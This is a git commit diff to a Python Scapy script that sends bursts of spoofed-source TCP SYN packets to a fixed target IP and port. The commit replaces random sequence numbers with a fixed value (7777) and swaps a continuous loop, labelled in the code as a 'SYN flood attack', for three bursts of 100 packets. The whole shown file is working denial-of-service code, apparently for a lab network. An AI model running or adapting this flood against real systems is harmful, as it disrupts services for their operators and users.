8fbf29c498a4709c5867a7bf3b2787b27094f3ce
maritpra <maritpra@hotmail.com>
2025-03-21 15:29:26 +0700

    update

--- syn_diff_isn.py
+++ syn_diff_isn.py
@@ -7,12 +7,13 @@ import time
 source_ip = "192.168.1.100"  
 destination_ip = "10.47.21.100"  
 target_port = 5211
+seq_num = 7777
 
 # Function to send 100 SYN packets
-def send_syn_flood():
+def send_syn_flood(seq_num):
     for _ in range(100):
         src_port = random.randint(1024, 65535)  
-        seq_num = random.randint(1000, 9000)  
+        #seq_num = random.randint(1000, 9000)  
 
         # Construct the TCP SYN packet
         syn_packet = IP(src=source_ip, dst=destination_ip) / TCP(sport=src_port, dport=target_port, flags="S", seq=seq_num)
@@ -20,10 +21,8 @@ def send_syn_flood():
         send(syn_packet, verbose=False)
 
 # Continuous loop to send SYN flood every second
-try:
-    while True:
-        send_syn_flood()
-        print(f"[+] Sent 100 SYN packets from {source_ip} to {destination_ip} on port {target_port}")
-        time.sleep(1)  
-except KeyboardInterrupt:
-    print("\n[!] Stopped SYN flood attack.")
+send_syn_flood(seq_num)
+print(f"[+] Sent SYN packets from {source_ip} to {destination_ip} on port {target_port} with {seq_num}")
+time.sleep(1)  
+send_syn_flood(seq_num)
+send_syn_flood(seq_num)
